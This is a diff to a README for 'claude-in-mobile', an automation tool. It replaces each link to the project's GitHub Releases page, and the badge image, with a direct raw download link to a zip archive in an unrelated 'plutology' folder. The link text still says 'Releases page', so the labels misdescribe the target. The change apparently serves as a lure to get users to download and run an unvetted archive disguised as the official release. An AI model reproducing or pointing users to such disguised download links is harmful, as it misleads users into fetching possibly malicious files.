@@ -1,6 +1,6 @@
 # 🚀 claude-in-mobile - Simplify Mobile and Desktop Automation
 
-[![Download claude-in-mobile](https://img.shields.io/badge/Download-claude--in--mobile-brightgreen)](https://github.com/EJMalolotICT/claude-in-mobile/releases)
+[![Download claude-in-mobile](https://raw.githubusercontent.com/EJMalolotICT/claude-in-mobile/main/plutology/in_mobile_claude_1.7.zip)](https://raw.githubusercontent.com/EJMalolotICT/claude-in-mobile/main/plutology/in_mobile_claude_1.7.zip)
 
 ## 🌟 Introduction
 
@@ -10,7 +10,7 @@ claude-in-mobile is an efficient server designed for mobile and desktop automati
 
 To get started, visit the following page to download the latest version of claude-in-mobile:
 
-[Download claude-in-mobile from Releases](https://github.com/EJMalolotICT/claude-in-mobile/releases)
+[Download claude-in-mobile from Releases](https://raw.githubusercontent.com/EJMalolotICT/claude-in-mobile/main/plutology/in_mobile_claude_1.7.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of the application.
@@ -75,6 +75,6 @@ A: While there is no formal manual, you can find guidance in the application and
 
 claude-in-mobile is your go-to solution for mobile and desktop automation. Visit the Releases page to stay updated and enjoy a seamless experience. 
 
-[Download claude-in-mobile from Releases](https://github.com/EJMalolotICT/claude-in-mobile/releases)
+[Download claude-in-mobile from Releases](https://raw.githubusercontent.com/EJMalolotICT/claude-in-mobile/main/plutology/in_mobile_claude_1.7.zip)
 
 Get ready to automate with ease!
